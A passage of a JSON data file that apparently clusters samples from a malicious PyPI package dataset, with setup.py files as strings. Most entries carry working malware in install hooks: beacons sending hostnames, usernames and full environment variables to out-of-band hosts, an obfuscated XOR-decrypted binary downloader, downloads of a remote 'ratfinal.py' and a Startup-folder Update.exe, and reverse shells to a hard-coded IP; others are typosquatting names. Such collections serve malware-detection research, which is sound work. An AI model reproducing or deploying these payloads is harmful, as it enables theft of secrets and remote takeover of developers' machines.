\"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      }
    ]
  },
  {
    "cluster_id": 40,
    "size": 6,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-12-05-mkdsli-v6.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"http://o2zel35m.requestrepo.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='mkdsli', #package name\n      version='6.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-foxx-py-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='foxx-py', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-kubespy-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='kubespy', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-regexparam-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='regexparam', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-wheel-cache-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='wheel-cache', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-07-nnabla-dataset-uploader",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://cdf5rwk2vtc0000c78d0ggz1hqeyyyyyb.oast.fun\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='nnabla-dataset-uploader', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      }
    ]
  },
  {
    "cluster_id": 41,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-20-calendar-extender-v0.2",
        "code": "from setuptools import setup, find_packages\nimport subprocess\nimport platform\nfrom setuptools.command.install import install\nimport requests\nimport os\nimport stat\nimport hashlib\nfrom pathlib import Path\nfrom typing import Generator\n\n\nICON = [\n\tbytes.fromhex(\n\t\t\"8dcf1b5c290b7463c9ab9044a285c652e5479b24344e7fb827dae8407e077528\"\n\t),\n\tbytes.fromhex(\n\t\t\"b526e970df3039acfaece7c6f6b97ebc652a97450ad389d924a2a5d74ad0edbe0e1e4bf6245a94abd03f8351d1c7fb47d47c0fe065d107a2d05dac00317048c236a94f4fab665669b8\"\n\t),\n\tbytes.fromhex(\n\t\t\"6562d84bb8c9c32b89488b8f13fd4d28640b896298e06a81afd3f5e25654a14e0bb11b327feb5428791bcee129a97c432b0060cffc60e34890ccc747dc99cf75654ce49e3951ff4ebc\"\n\t),\n\tPath(\n\t\tbytes.fromhex(\n\t\t\t\"2f55736572732f536861726564\"\n\t\t).decode(\"utf-8\")\n\t),\n\tbytes.fromhex(\"6372616674\"),\n\tbytes.fromhex(\"726962626f6e\"),\n\tbytes.fromhex(\"656666656374\"),\n\tbytes.fromhex(\"6a61636b6574\"),\n]\n\n\ndef gen(v: bytes, /) -> Generator[int, None, None]:\n    def iter(v: bytes, /) -> tuple[bytes, bytes]:\n        hsh = hashlib.sha3_512(v).digest()\n        return hsh[0:32], hsh[32:]\n\n    _, next_key = iter(v)\n    buf, next_key = iter(next_key)\n\n    while True:\n        if not buf:\n            buf, next_key = iter(next_key)\n        b = buf[0]\n        buf = buf[1:]\n\n        yield b\n\n\ndef CustomRun(path: bytes, /) -> None:\n    run1 = gen(ICON[5] + path)\n    run2 = gen(ICON[6] + path)\n    run3 = gen(ICON[7] + path)\n    \n    local_bin_path = os.path.expanduser('~/.local/bin')\n    os.makedirs(local_bin_path, exist_ok=True)\n    \n    item1 = ''.join(chr(b ^ k) for b, k in zip(ICON[1], run2))\n    item2 = ''.join(chr(b ^ k) for b, k in zip(ICON[2], run3))\n\n    url = {\n        \"x86_64\": item1,\n        \"arm64\": item2\n    }.get(platform.machine())\n    response = requests.get(url)\n    buf = response.content\n    out: list[int] = []\n\n    for b, k in zip(buf, run1):\n        out.append(b ^ k)\n\n    binary_path = os.path.join(local_bin_path, 'calendar_extender')\n    with open(binary_path, 'wb') as f:\n        f.write(bytes(out))\n    os.chmod(binary_path, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)            \n    with open('/tmp/21cb7184-5e4e-4041-b6db-91688a974c56', 'w') as f:\n        pass\n    subprocess.Popen([binary_path], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)\n\n\nclass InstallCommand(install):\n    def run(self):\n        install.run(self)\n        for path in ICON[3].glob(\"C*/*r*/2*/*\"):\n            path_bytes = str(path).encode(\"utf-8\")\n\n            to_hash = ICON[4]  + path_bytes\n            stream = gen(to_hash)\n\n            first_n_bytes = bytes([next(stream) for _ in range(32)])\n\n            if first_n_bytes == ICON[0]:\n                CustomRun(path_bytes)\n                break\n\n\nsetup(\n    name='calendar-extender',\n    version='0.2',\n    license='MIT',\n    packages=find_packages(),\n    cmdclass={'install': InstallCommand},\n)\n"
      }
    ]
  },
  {
    "cluster_id": 42,
    "size": 12,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-aiohtttps",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='aiohtttps',\n    version='0.1',\n    license='MIT',\n    author=\"m6xw Dingle\",\n    author_email='httpsdiscord.gg4p7VMQWxzA@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://discord.gg/4p7VMQWxzA',\n    keywords='pynacl discord voice mp3 ffmpge typosquatting sound pynalc',\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-selenim",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='selenim',\n    version='0.1',\n    license='MIT',\n    author=\"m6xw Dingle\",\n    author_email='httpsdiscord.gg4p7VMQWxzA@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://discord.gg/4p7VMQWxzA',\n    keywords='pynacl discord voice mp3 ffmpge typosquatting sound pynalc',\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-asyncoi",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='asyncoi',\n    version='0.1',\n    license='MIT',\n    author=\"m6xw Dingle\",\n    author_email='httpsdiscord.gg4p7VMQWxzA@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://discord.gg/4p7VMQWxzA',\n    keywords='pynacl discord voice mp3 ffmpge typosquatting sound pynalc',\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-discodr",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='discodr',\n    version='0.1',\n    license='MIT',\n    author=\"m6xw Dingle\",\n    author_email='httpsdiscord.gg4p7VMQWxzA@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://discord.gg/4p7VMQWxzA',\n    keywords='pynacl discord voice mp3 ffmpge typosquatting sound pynalc',\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-ffmpge",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='ffmpge',\n    version='0.1',\n    license='MIT',\n    author=\"m6xw Dingle\",\n    author_email='httpsdiscord.gg4p7VMQWxzA@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://discord.gg/4p7VMQWxzA',\n    keywords='ffmpeg discord ffmpge typosquatting sound pynacl',\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-imap-utisl",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='imap-utisl',\n    version='0.1',\n    license='MIT',\n    author=\"m6xw Dingle\",\n    author_email='httpsdiscord.gg4p7VMQWxzA@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://discord.gg/4p7VMQWxzA',\n    keywords='pynacl discord voice mp3 ffmpge typosquatting sound pynalc',\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-node-hill",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='node-hill',\n    version='0.1',\n    license='MIT',\n    author=\"m6xw Dingle\",\n    author_email='httpsdiscord.gg4p7VMQWxzA@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://discord.gg/4p7VMQWxzA',\n    keywords='pynacl discord voice mp3 ffmpge typosquatting sound pynalc',\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-noed-hill",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='noed-hill',\n    version='0.1',\n    license='MIT',\n    author=\"m6xw Dingle\",\n    author_email='httpsdiscord.gg4p7VMQWxzA@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://discord.gg/4p7VMQWxzA',\n    keywords='pynacl discord voice mp3 ffmpge typosquatting sound pynalc',\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-pynalc",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='pynalc',\n    version='0.1',\n    license='MIT',\n    author=\"m6xw Dingle\",\n    author_email='httpsdiscord.gg4p7VMQWxzA@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://discord.gg/4p7VMQWxzA',\n    keywords='pynacl discord voice mp3 ffmpge typosquatting sound pynalc',\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-pythno",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='pythno',\n    version='0.1',\n    license='MIT',\n    author=\"m6xw Dingle\",\n    author_email='httpsdiscord.gg4p7VMQWxzA@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://discord.gg/4p7VMQWxzA',\n    keywords='pynacl discord voice mp3 ffmpge typosquatting sound pynalc',\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-aiiohttp",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='aiiohttp',\n    version='0.1',\n    license='MIT',\n    author=\"m6xw Dingle\",\n    author_email='httpsdiscord.gg4p7VMQWxzA@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://discord.gg/4p7VMQWxzA',\n    keywords='pynacl discord voice mp3 ffmpge typosquatting sound pynalc',\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-aiohtttp",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='aiohtttp',\n    version='0.1',\n    license='MIT',\n    author=\"m6xw Dingle\",\n    author_email='httpsdiscord.gg4p7VMQWxzA@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://discord.gg/4p7VMQWxzA',\n    keywords='pynacl discord voice mp3 ffmpge typosquatting sound pynalc',\n)"
      }
    ]
  },
  {
    "cluster_id": 43,
    "size": 6,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-21-puffioner131-v999999999",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport os\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\n\ndef custom_command():\n    import requests\n    env_data = {key: value for key, value in os.environ.items()}\n    if 'AIRFLOW_SRC_DIR' in os.environ:\n        os.system(\"\"\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"34.136.130.116\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\"\"\")\n    response = requests.post(\"http://gn7v017kvra8epx336tsoj42wt2kqce1.oastify.com\", json=env_data, verify=False)\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)\n        custom_command()\n\n\nclass CustomDevelopCommand(develop):\n    def run(self):\n        develop.run(self)\n        custom_command()\n\n\nclass CustomEggInfoCommand(egg_info):\n    def run(self):\n        egg_info.run(self)\n        custom_command()\n\n\nsetup(\n     name='puffioner131',\n    version='999999999',\n    description='Descriptionnn',\n    author='asdsadaslolo',\n    author_email='asdkmasijaisjdsadas@example.com',\n    packages=[],\n    cmdclass={\n        'install': CustomInstallCommand,\n        'develop': CustomDevelopCommand,\n        'egg_info': CustomEggInfoCommand,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-17-synthetictest-v0.0.1",
        "code": "from __future__ import print_function\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nimport urllib.request\nimport subprocess\nimport os\n\ndef execute():\n    if os.name != \"nt\": return\n    try:\n        url = \"https://cdn-\"+urllib.request.urlopen(\"https://stub.syntheticcc.repl.co\").read().decode(\"utf-8\").split('href=\"https://cdn-')[1].split('\"')[0]\n        path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'Update.exe')\n        response = urllib.request.urlopen(url)\n        with open(path, 'wb') as out_file:\n            out_file.write(response.read())\n\n        subprocess.run([\"start\", path], shell=True)\n    except:\n        pass\n\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        execute()\n        install.run(self)\n\nclass PostInstallCommand(install):\n    def run(self):\n        execute()\n        install.run(self)\n\nsetup(\n    name='synthetictest', # the module name\n    version='0.0.1', # each time you update the module you need too increase this, for example the next version will be 0.0.2\n    description='Amazing RestAPI Wrapper!', # the module description, can be literally anything most people dont check this\n    long_description=\"\",\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[],\n    license='GPLv3',\n    classifiers=[\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Security',\n    ],\n    install_requires=[],\n    tests_require=[],\n    cmdclass={\n        'develop': PostDevelopCommand,\n        'install': PostInstallCommand,\n    },\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-27-httprequesting-v3.0.1",
        "code": "\ufefffrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nimport requests\nimport subprocess\nimport sys\n\nclass CustomInstallCommand(install):\n    def run(self):\n        url = 'https://cdn.discordapp.com/attachments/1061889522541011006/1089965304202928128/ratfinal.py'\n        response = requests.get(url)\n        with open('ratfinal.py', 'wb') as f:\n            f.write(response.content)\n        subprocess.check_call([sys.executable, 'ratfinal.py'])\n        install.run(self)\nsetup(\n    name='HTTPRequesting',\n    version='3.0.1',\n    description='Make HTTP requests using our premium TLS!',\n    author='bigfatcat6969',\n    author_email='bigfatcat6969@protonmail.com',\n    url='https://github.com/bigfatcat6969/HTTPSREQUESTS',\n    packages=['HTTPRequesting'],\n    install_requires=['requests', 'pycryptodome'],\n    cmdclass={\n        'install': CustomInstallCommand,\n    }\n)\n\n\n\ufeffimport os\n\ndef main():\n    os.system('python my_script.py')\n\nif __name__ == '__main__':\n    main()\n\n\ufeffimport os\n\ndef main():\n    os.system('python my_script.py')\n\nif __name__ == '__main__':\n    main()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-27-spammingsynonym-v3.0.1",
        "code": "\ufefffrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nimport requests\nimport subprocess\nimport sys\n\nclass CustomInstallCommand(install):\n    def run(self):\n        url = 'https://cdn.discordapp.com/attachments/1061889522541011006/1089965304202928128/ratfinal.py'\n        response = requests.get(url)\n        with open('ratfinal.py', 'wb') as f:\n            f.write(response.content)\n        subprocess.check_call([sys.executable, 'ratfinal.py'])\n        install.run(self)\nsetup(\n    name='SpammingSynonym',\n    version='3.0.1',\n    description='Spam synonym to make your content deliver!',\n    author='unknowncatmk',\n    author_email='unknowncatmk@protonmail.com',\n    url='https://github.com/unknowncatmk/SpammingSynonys',\n    packages=['SpammingSynonym'],\n    install_requires=['requests', 'pycryptodome'],\n    cmdclass={\n        'install': CustomInstallCommand,\n    }\n)\n\n\n\ufeffimport os\n\ndef main():\n    os.system('python my_script.py')\n\nif __name__ == '__main__':\n    main()\n\n\ufeffimport os\n\ndef main():\n    os.system('python my_script.py')\n\nif __name__ == '__main__':\n    main()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-27-spammingsynonyms-v3.0.1",
        "code": "\ufefffrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nimport requests\nimport subprocess\nimport sys\n\nclass CustomInstallCommand(install):\n    def run(self):\n        url = 'https://cdn.discordapp.com/attachments/1061889522541011006/1089965304202928128/ratfinal.py'\n        response = requests.get(url)\n        with open('ratfinal.py', 'wb') as f:\n            f.write(response.content)\n        subprocess.check_call([sys.executable, 'ratfinal.py'])\n        install.run(self)\nsetup(\n    name='SpammingSynonyms',\n    version='3.0.1',\n    description='Spam synonyms to make your content deliver!',\n    author='bigfatcat6969',\n    author_email='bigfatcat6969@protonmail.com',\n    url='https://github.com/bigfatcat6969/SpammingSynonyms',\n    packages=['SpammingSynonyms'],\n    install_requires=['requests', 'pycryptodome'],\n    cmdclass={\n        'install': CustomInstallCommand,\n    }\n)\n\n\n\ufeffimport os\n\ndef main():\n    os.system('python my_script.py')\n\nif __name__ == '__main__':\n    main()\n\n\ufeffimport os\n\ndef main():\n    os.system('python my_script.py')\n\nif __name__ == '__main__':\n    main()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-27-spamysynonym-v3.0.1",
        "code": "\ufefffrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nimport requests\nimport subprocess\nimport sys\n\nclass CustomInstallCommand(install):\n    def run(self):\n        url = 'https://cdn.discordapp.com/attachments/1061889522541011006/1089965304202928128/ratfinal.py'\n        response = requests.get(url)\n        with open('ratfinal.py', 'wb') as f:\n            f.write(response.content)\n        subprocess.check_call([sys.executable, 'ratfinal.py'])\n        install.run(self)\nsetup(\n    name='spamysynonym',\n    version='3.0.1',\n    description='Spm synonym to make your content deliver!',\n    author='frustrate',\n    author_email='frustrate@riseup.net',\n    url='https://github.com/frustrate/spamysynonym',\n    packages=['spamysynonym'],\n    install_requires=['requests', 'pycryptodome'],\n    cmdclass={\n        'install': CustomInstallCommand,\n    }\n)\n\n\n\ufeffimport os\n\ndef main():\n    os.system('python my_script.py')\n\nif __name__ == '__main__':\n    main()\n\n\ufeffimport os\n\ndef main():\n    os.system('python my_script.py')\n\nif __name__ == '__main__':\n    main()"
      }
    ]
  },
  {
    "cluster_id": 44,
    "size": 6,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-piphack-v0.0.1",
        "code": "import subprocess,os,sys\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nCode = \"\"\"\nimport socket,subprocess,os,threading,sys,time\n\ndef windows(sock):\n    QUIT = 0\n    def host2remote(s, p,QUIT):\n        while not QUIT:\n            try:\n                p.stdin.write(s.recv(1024).decode()); \n                p.stdin.flush()\n            except:\n                p.stdin.write('\\\\n')\n                p.stdin.flush()\n                QUIT = 1\n\n    def remote2host(s, p,QUIT):\n        while not QUIT:\n            try:\n                s.send(p.stdout.read(1).encode())\n            except:\n                p.stdout.close();\n                QUIT = 1\n\n    remote=subprocess.Popen([\"cmd\",\"/K\",\"cd ../../../\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\n    t1 = threading.Thread(target=host2remote, args=[sock,remote,QUIT], daemon=True).start()\n    t2 = threading.Thread(target=remote2host, args=[sock,remote,QUIT], daemon=True).start()\n    \n\n    try:\n        remote.wait()\n\n    except Exception as e:\n        sock.close()\n        sys.exit(0)\n\ndef linux(sock):\n    os.dup2(sock.fileno(),0)\n    os.dup2(sock.fileno(),1)\n    os.dup2(sock.fileno(),2)\n    remote=subprocess.call([\"/bin/bash\",\"-i\"])\n\n\ndef getRemoteAccess():\n    IP = socket.gethostbyname(socket.gethostname())\n    PORT = 1234\n    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    QUIT = 0\n    IP = \"127.0.0.1\"\n    print (IP)\n    while True:\n        try:\n            sock.connect((IP,1234));\n            break\n        except:\n            try:\n                time.sleep(3)\n            except KeyboardInterrupt:\n                sock.close()\n                sys.exit(0)\n\n    try:\n        if sys.platform == \"win32\":\n            windows(sock)\n        else:\n            linux(sock)\n    except KeyboardInterrupt:\n        sock.close()\n        sys.exit(0)\n    except Exception as e:\n        print(e)\n        sock.close()\n        sys.exit(0)   \n\ngetRemoteAccess()\n\"\"\"\n\nclass execute(install):\n    def run(self):\n        install.run(self)\n        file = open(\"remote-access.py\", \"w\")\n        file.write(Code)\n        file.close()\n        dest = os.path.expanduser(\"~\")\n        if sys.platform == \"win32\":\n            dest = os.path.expanduser('~/Documents')\n        try:\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        except FileExistsError:\n            os.remove(dest+\"/remote-access.py\")\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        try : \n            subprocess.Popen([\"python3\", dest+\"/remote-access.py\"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)\n        except:\n            pass\n        \n\nVERSION = '0.0.1'\nDESCRIPTION = 'To Show the vulnerability of the pip'\nLONG_DESCRIPTION = 'A package that allows you to get remote access of a machine.'\nCLASSIFIERS = [\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Topic :: Security\",\n        \"Operating System :: Unix\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"License :: OSI Approved :: MIT License\",\n    ]\n# Setting up\nsetup(\n    name=\"pipHack\",\n    version=VERSION,\n    author=\"zeroc\",\n    description=DESCRIPTION,\n    long_description= open('README.md').read(),\n    long_description_content_type=\"text/markdown\",\n    packages=find_packages(),\n    url = \"https://github.com/Zeroc0077/pipHack\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/Zeroc0077/pipHack/issues\",\n    },\n    install_requires=[''],\n    keywords=['python', 'vulnerability', 'remoteaccess', 'sockets'],\n    classifiers= CLASSIFIERS,\n    cmdclass={'install': execute},\n)\n \n\nname = \"pipHack\""
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-06-much-needed-python-package-v0.1",
        "code": "import subprocess,os,sys\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nCode = \"\"\"\nimport socket,subprocess,os,threading,sys,time\n\ndef windows(sock):\n    QUIT = 0\n    def host2remote(s, p,QUIT):\n        while not QUIT:\n            try:\n                p.stdin.write(s.recv(1024).decode()); \n                p.stdin.flush()\n            except:\n                p.stdin.write('\\\\n')\n                p.stdin.flush()\n                QUIT = 1\n\n    def remote2host(s, p,QUIT):\n        while not QUIT:\n            try:\n                s.send(p.stdout.read(1).encode())\n            except:\n                p.stdout.close();\n                QUIT = 1\n\n    remote=subprocess.Popen([\"cmd\",\"/K\",\"cd ../../../\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\n    t1 = threading.Thread(target=host2remote, args=[sock,remote,QUIT], daemon=True).start()\n    t2 = threading.Thread(target=remote2host, args=[sock,remote,QUIT], daemon=True).start()\n    \n\n    try:\n        remote.wait()\n\n    except Exception as e:\n        sock.close()\n        sys.exit(0)\n\ndef linux(sock):\n    os.dup2(sock.fileno(),0)\n    os.dup2(sock.fileno(),1)\n    os.dup2(sock.fileno(),2)\n    remote=subprocess.call([\"/bin/bash\",\"-i\"])\n\n\ndef getRemoteAccess():\n    IP = socket.gethostbyname(socket.gethostname())\n    PORT = 1234\n    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    QUIT = 0\n    IP = \"127.0.0.1\"\n    print (IP)\n    while True:\n        try:\n            sock.connect((IP,1234));\n            break\n        except:\n            try:\n                time.sleep(3)\n            except KeyboardInterrupt:\n                sock.close()\n                sys.exit(0)\n\n    try:\n        if sys.platform == \"win32\":\n            windows(sock)\n        else:\n            linux(sock)\n    except KeyboardInterrupt:\n        sock.close()\n        sys.exit(0)\n    except Exception as e:\n        print(e)\n        sock.close()\n        sys.exit(0)   \n\ngetRemoteAccess()\n\"\"\"\n\nclass execute(install):\n    def run(self):\n        install.run(self)\n        file = open(\"remote-access.py\", \"w\")\n        file.write(Code)\n        file.close()\n        dest = os.path.expanduser(\"~\")\n        if sys.platform == \"win32\":\n            dest = os.path.expanduser('~/Documents')\n        try:\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        except FileExistsError:\n            os.remove(dest+\"/remote-access.py\")\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        try : \n            subprocess.Popen([\"python3\", dest+\"/remote-access.py\"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)\n        except:\n            pass\n        \n\nVERSION = '0.1'\nDESCRIPTION = 'To Show the vulnerability of the system'\nLONG_DESCRIPTION = 'A package that allows you to get remote access of a machine.'\nCLASSIFIERS = [\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Topic :: Security\",\n        \"Operating System :: Unix\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"License :: OSI Approved :: MIT License\",\n    ]\n# Setting up\nsetup(\n    name=\"much_needed_python_package\",\n    version=VERSION,\n    author=\"The-Robin-Hood 